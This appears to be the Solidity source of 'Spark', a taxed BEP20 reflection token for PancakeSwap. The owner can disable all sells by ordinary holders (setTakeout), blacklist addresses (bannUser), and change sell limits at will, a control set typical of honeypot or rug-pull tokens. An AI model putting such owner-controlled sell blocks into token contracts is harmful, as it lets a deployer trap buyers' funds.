// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity >=0.6.0;
import "./IBEP20.sol";
import "./SafeMath.sol";

interface IMiner {
    function AddOneCut(uint256 amount) external;
}

contract SparkToken is IBEP20
{
    using SafeMath for uint256;
    address _owner;
    address _miner;
    address _minerpool;
    uint256 _maxSupply= 8800000000 * 1e8;

    string constant  _name = 'Spark';
    string constant _symbol = 'SPA';
    uint8 immutable _decimals = 8;
 
    address _pancakeAddress;
    // uint256 _totalsupply;  
    
    mapping (address => mapping (address => uint256)) private _allowances;
    
    mapping(address=>bool) _isExcluded;
    address[] private _excluded;
    
    mapping(address=>bool) _minter;
    mapping(address=>bool) _banneduser;
    
    address _feeowner;
    address _bonusowner;
    
    uint256 _maxlimit = 20000;
    uint256 _timeslimit = 100 * 1e8;
    bool _takeout = true;
    bool _takebonus = true;
    
    uint256 private constant MAX = ~uint256(0); // 8800000000 * 1e8;
    uint256 private _tTotal = _maxSupply;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
  
    constructor(address feeowner)
    {
        _owner = msg.sender;
        
        _rOwned[_owner] = _rTotal;
        emit Transfer(address(0), _owner, _tTotal);

        _feeowner = feeowner;
        
        addExcluded(_owner);
        addExcluded(_feeowner);
        addExcluded(address(0));
        
    }

    function setMiner(address miner,address minerpool) public
    {
         require(msg.sender==_owner);
         _miner=miner;
         _minerpool=minerpool;
         addExcluded(_minerpool);
    }
    
    function setLimit(uint256 maxlimit,uint256 timeslimit) public
    {
         require(msg.sender==_owner);
         _maxlimit  = maxlimit;
         _timeslimit= timeslimit;
    }
    
    function setTakeout(bool takeout) public 
    {
        require(msg.sender==_owner);
        _takeout = takeout;
    }

    function bannUser(address user,bool ban) public
    {
         require(msg.sender==_owner);
         _banneduser[user]=ban;
    }

    function setPancakeAddress(address pancakeAddress) public
    {
        require(msg.sender==_owner);
        _pancakeAddress=pancakeAddress;
        addExcluded(_pancakeAddress);
    }
    
    function _reflectFee(uint256 rFee, uint256 tFee) private {
        
        if(!_takebonus) {
            return;
        }
        
        if(_rTotal.sub(rFee) < _tTotal) {
            _rOwned[address(0)] = _rOwned[address(0)].add(rFee);
            _tOwned[address(0)] = _tOwned[address(0)].add(tFee);
            return;
        }
        
        uint256 tSupply = _getTCurrentSupply();
        if(tSupply == tFee) {
            _rOwned[address(0)] = _rOwned[address(0)].add(rFee);
            _tOwned[address(0)] = _tOwned[address(0)].add(tFee);
            return;
        }
        
        _rTotal = _rTotal.sub(rFee, "reflect fee");
        
    }
    
    function getRate() public view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;      
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply.sub(_rOwned[_excluded[i]], "sub rSupply");
            tSupply = tSupply.sub(_tOwned[_excluded[i]], "sub tSupply");
        }
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
    
    function _getTCurrentSupply() private view returns(uint256) {
        uint256 tSupply = _tTotal;      
        for (uint256 i = 0; i < _excluded.length; i++) {
            tSupply = tSupply.sub(_tOwned[_excluded[i]]);
        }
        return tSupply;
    }
    
    function tokenFromReflection(uint256 rAmount) private view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        return rAmount.div(getRate());
    }

    function name() public  pure returns (string memory) {
        return _name;
    }

    function symbol() public  pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function addExcluded(address account) public 
    {
        require(msg.sender== _owner);
        require(!_isExcluded[account], "Account is already excluded");
        if(_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }

    function takeOutErrorTransfer(address tokenaddress) public
    {
        require(msg.sender==_owner);
        IBEP20(tokenaddress).transfer(_owner, IBEP20(tokenaddress).balanceOf(address(this)));
    }


    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function isExcluded(address account) public view returns (bool) {
        return _isExcluded[account];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        _transfer(sender, recipient, amount);
        return true;
    }

   function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

   function increaseAllowance(address spender, uint256 addedValue) public  returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public  returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function burnFrom(address sender, uint256 amount) public override  returns (bool)
    {
         _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        _burn(sender,amount);
        return true;
    }

    function burn(uint256 amount) public override returns (bool)
    {
        _burn(msg.sender,amount);
        return true;
    }
 
    function _burn(address sender,uint256 tAmount) private
    {
         require(sender != address(0), "ERC20: transfer from the zero address");
         require(tAmount > 0, "Transfer amount must be greater than zero");
         
         uint256 currentRate = getRate();
         uint256 rAmount = tAmount.mul(currentRate);
         _rOwned[sender] = _rOwned[sender].sub(rAmount);
         _rOwned[address(0)] = _rOwned[address(0)].add(rAmount); 
         
         if(isExcluded(sender)) {
            _tOwned[sender] = _tOwned[sender].sub(tAmount);
         }
         if(isExcluded(address(0))) {
            _tOwned[address(0)] = _tOwned[address(0)].add(tAmount); 
         }
        
         emit Transfer(sender, address(0), tAmount);
    }


    function _transfer(address sender, address recipient, uint256 tAmount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(_banneduser[sender]==false,"banned");
  
        uint256 currentRate = getRate();
        uint256 tTransferAmount = tAmount;
        uint256 rBonus = 0;
        uint256 tBonus = 0;
        if(recipient == _pancakeAddress)
        {
            if(!isExcluded(sender))
            {
                require(tAmount <= _maxlimit*1e8, "ERC20: transfer amount unit limit");
                require(tAmount.mod(_timeslimit) == 0, "ERC20: transfer amount times limit");
                require(_takeout, "takeout error");
                
                uint256 onepercent = tAmount.mul(1).div(100);
                if(onepercent > 0)
                {
                    uint256 tBurn = onepercent.mul(1);
                    uint256 tMinerPool = onepercent.mul(5);
                    tBonus = onepercent.mul(4);
                    uint256 tDev = onepercent.mul(2);
                    
                    _takeTax(tBurn, tMinerPool, tDev);
                    
                    IMiner(_miner).AddOneCut(tMinerPool);
                    
                    emit Transfer(sender, address(0), tBurn);
                    emit Transfer(sender, _minerpool, tMinerPool);
                    emit Transfer(sender, _feeowner, tDev);
                    emit Transfer(sender, address(0), tBonus);
                    
                    uint256 tFee = tBurn.add(tMinerPool).add(tBonus).add(tDev);  //onepercent.mul(12);
                    tTransferAmount = tTransferAmount.sub(tFee);
                }
            }
        }
        
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rTransferAmount = tTransferAmount.mul(currentRate);
        
        _rOwned[sender]= _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        
        if(_isExcluded[sender]) {
            _tOwned[sender]= _tOwned[sender].sub(tAmount);
        }
        
        if(_isExcluded[recipient]) {
            _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        }
        
        rBonus = tBonus.mul(currentRate);
        _reflectFee(rBonus, tBonus);
        
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _takeTax(uint256 tBurn, uint256 tMinerPool, uint256 tDev) private {
        
        uint256 currentRate =  getRate();
        uint256 rBurn = tBurn.mul(currentRate);
        uint256 rMinerPool = tMinerPool.mul(currentRate);
        uint256 rDev = tDev.mul(currentRate);
        
        _rOwned[address(0)] = _rOwned[address(0)].add(rBurn);
        if(_isExcluded[address(0)]) {
            _tOwned[address(0)] = _tOwned[address(0)].add(tBurn);
        }
        
        _rOwned[_minerpool] = _rOwned[_minerpool].add(rMinerPool);
        if (_isExcluded[_minerpool]) {
            _tOwned[_minerpool] = _tOwned[_minerpool].add(tMinerPool);
        }
        
        _rOwned[_feeowner] = _rOwned[_feeowner].add(rDev);
        if (_isExcluded[_feeowner]) {
            _tOwned[_feeowner] = _tOwned[_feeowner].add(tDev);
        }
        
    }
    
}